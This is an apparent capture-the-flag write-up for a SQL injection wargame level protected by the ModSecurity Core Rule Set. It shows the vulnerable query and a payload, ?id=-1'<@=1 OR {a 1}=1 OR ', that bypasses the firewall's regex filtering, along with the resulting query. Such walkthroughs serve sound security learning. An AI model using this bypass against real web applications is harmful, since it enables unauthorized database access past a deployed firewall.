---
custom_edit_url: null
sidebar_position: 33
tags: [SQLi, MOD Security CRS, WAF bypass]
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/a45d4dce-407b-416d-8625-dd9680076748)

We are provided with the SQL query:

```sql
SELECT id FROM prob_cthulhu WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

&nbsp;

## MOD Security CRS

The MOD Security Core Rule Set, is a set of regex expressions that Web Application Firewalls can use to filter traffic. In this case, out input is being filtered based on this rule set.

In order to bypass this, we can refer [this](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181) Github issue .

![2](https://github.com/Kunull/Write-ups/assets/110326359/7c4e4729-0eb9-45dd-b350-97556d0cd332)

If we provide the following URI parameter:

```
?id=-1'<@=1 OR {a 1}=1 OR '
```

The resultant query becomes:

```sql
SELECT id FROM prob_cthulhu WHERE id='-1'<@=1 OR {a 1}=1 OR '' AND pw=''
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/64228788-fb14-4d48-a302-192e1d8a2041)
